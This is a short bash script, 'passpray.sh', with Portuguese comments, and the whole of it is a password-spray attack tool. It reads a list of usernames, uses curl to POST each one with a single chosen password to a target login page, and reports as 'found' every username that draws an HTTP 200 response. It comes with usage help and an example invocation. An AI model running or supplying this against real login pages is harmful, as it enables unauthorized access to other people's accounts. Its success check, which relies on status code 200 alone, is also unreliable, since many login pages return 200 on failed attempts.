#!/bin/bash
target=$3
userlist=$1
password=$2
userparam=$4
passparam=$5

ps(){
 declare -i cont
 cont=0
 #Carrega arquivo no array
 IFS=$'\n'
 declare -a arr
 for word in $(cat $userlist); do
  arr+=($word)
 done

 #Password spray
 echo "Starting password spray, please wait..."
 for i in ${arr[@]};do
  req=$(curl -s -o /dev/null -w "%{http_code}" --data "$userparam=$i&$passparam=$password" $target)
  if [ $req = "200" ]; then
   echo "User found: $i"
   cont+=1
  fi 
 done
 echo "Finished, $cont users found."
}

help(){
 echo "Use: ./passpray.sh userlist password website user_param password_param"
 echo "Example: ./passpray.sh userlist.txt test http://example.com/login.php name pass"
}

if ! [ $# -eq 5 ]; then
 help
else
 ps
fi